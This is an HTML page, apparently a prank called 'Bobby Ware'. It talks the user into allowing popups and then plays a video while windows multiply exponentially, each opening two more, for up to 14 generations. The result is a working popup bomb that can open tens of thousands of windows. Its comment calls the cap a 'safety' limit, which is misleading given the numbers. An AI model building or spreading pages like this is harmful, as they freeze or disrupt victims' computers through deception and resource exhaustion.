<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<title>Bobby Ware</title>
<style>
  html, body {
    margin: 0;
    height: 100%;
    background: #0b1530;
    color: #fff;
    font-family: -apple-system, "Segoe UI", Roboto, Arial, sans-serif;
    display: flex;
    align-items: center;
    justify-content: center;
    text-align: center;
    overflow: hidden;
  }
  #ui {
    max-width: 420px;
    padding: 24px;
  }
  h1 {
    font-weight: 600;
    margin-bottom: 8px;
  }
  p {
    color: #b9c2dd;
    font-size: 14px;
    line-height: 1.4;
  }
  button {
    background: #3b6cf0;
    color: #fff;
    border: none;
    border-radius: 8px;
    padding: 12px 22px;
    font-size: 15px;
    margin: 8px 6px 0;
    cursor: pointer;
  }
  button:disabled {
    background: #33406b;
    cursor: not-allowed;
  }
  button:hover:not(:disabled) {
    background: #2f5adf;
  }
  #spawnImg, video {
    display: none;
    position: fixed;
    top: 0;
    left: 0;
    width: 100vw;
    height: 100vh;
    object-fit: cover;
  }
  #closeBtn {
    position: fixed;
    top: 10px;
    right: 10px;
    background: #ff4d4f;
    display: none;
    z-index: 10;
  }
</style>
</head>
<body>

<div id="ui">
  <h1>Bobby Ware</h1>
  <p id="status">
    Step 1: click "Enable Popups" (this lets the browser grant permission
    for this page to open new windows).<br><br>
    Step 2: click "Start" to begin.
  </p>
  <button id="enableBtn">Enable Popups</button>
  <button id="startBtn" disabled>Start</button>
</div>

<img id="spawnImg" src="spawn.jpg" alt="">
<video id="vid" src="video.mp4" playsinline></video>
<button id="closeBtn">Close this window</button>

<script>
  const params    = new URLSearchParams(location.search);
  const gen       = parseInt(params.get('gen') || '0', 10);
  const CHILDREN  = 2;      // how many popups each window spawns
  const SPAWN_MS  = 1500;   // how long a photo window shows before spawning more
  const MAX_GEN   = 14;     // safety cap so it can't literally lock up your PC forever

  const ui        = document.getElementById('ui');
  const img       = document.getElementById('spawnImg');
  const vid       = document.getElementById('vid');
  const closeBtn  = document.getElementById('closeBtn');

  document.title = gen === 0 ? 'Bobby Ware' : 'Bobby Ware #' + gen;

  function randomWindowFeatures() {
    const w = 480;
    const h = 360;
    const screenW = window.screen.availWidth  || 1200;
    const screenH = window.screen.availHeight || 800;
    const left = Math.floor(Math.random() * Math.max(screenW - w, 0));
    const top  = Math.floor(Math.random() * Math.max(screenH - h, 0));
    return `width=${w},height=${h},left=${left},top=${top}`;
  }

  function spawnChildren() {
    if (gen >= MAX_GEN) return;
    const nextGen = gen + 1;
    for (let i = 0; i < CHILDREN; i++) {
      window.open(`index.html?gen=${nextGen}`, '_blank', randomWindowFeatures());
    }
  }

  function beginRoot() {
    // Root window: plays the video with sound. Halfway through, spawns photo popups.
    ui.style.display       = 'none';
    vid.style.display      = 'block';
    closeBtn.style.display = 'block';

    vid.addEventListener('error', () => {
      document.body.insertAdjacentHTML('beforeend',
        '<p style="position:fixed;top:10px;left:10px;color:#ff8a8a;' +
        'font-size:14px;background:#0b1530;padding:8px 12px;border-radius:6px;">' +
        'Video failed to load — make sure a file named exactly "video.mp4" ' +
        'is in the same folder as index.html.</p>');
    });

    vid.play().catch(() => {
      document.body.insertAdjacentHTML('beforeend',
        '<p style="position:fixed;top:10px;left:10px;color:#ff8a8a;' +
        'font-size:14px;background:#0b1530;padding:8px 12px;border-radius:6px;">' +
        'Video could not autoplay in this browser.</p>');
    });

    let spawned = false;
    vid.addEventListener('timeupdate', () => {
      if (!spawned && vid.duration && vid.currentTime >= vid.duration / 2) {
        spawned = true;
        spawnChildren();
      }
    });
  }

  function beginChild() {
    // Child windows: just the photo, instantly, then spawn more after a short beat.
    ui.style.display       = 'none';
    img.style.display      = 'block';
    closeBtn.style.display = 'block';
    setTimeout(spawnChildren, SPAWN_MS);
  }

  closeBtn.onclick = () => window.close();

  if (gen === 0) {
    // Root window: require the user to grant popup permission, then Start.
    document.getElementById('enableBtn').onclick = () => {
      let test1, test2;
      try {
        test1 = window.open('about:blank', '_blank', 'width=100,height=100');
        test2 = window.open('about:blank', '_blank', 'width=100,height=100,left=150');
      } catch (e) {
        test1 = null;
        test2 = null;
      }
      setTimeout(() => {
        const blocked1 = !test1 || test1.closed || typeof test1.closed === 'undefined';
        const blocked2 = !test2 || test2.closed || typeof test2.closed === 'undefined';
        if (!blocked1 && !blocked2) {
          test1.close();
          test2.close();
          document.getElementById('status').textContent =
            'Popups are enabled. Press Start to begin.';
          document.getElementById('startBtn').disabled = false;
        } else {
          if (!blocked1) test1.close();
          if (!blocked2) test2.close();
          document.getElementById('status').textContent =
            'Your browser blocked the popup. Look for a blocked-popup icon in the ' +
            'address bar, choose "Always allow popups from this site," then click ' +
            '"Enable Popups" again.';
        }
      }, 300);
    };
    document.getElementById('startBtn').onclick = beginRoot;
  } else {
    // Child windows: instant photo, no UI, no video.
    beginChild();
  }
</script>

</body>
</html>
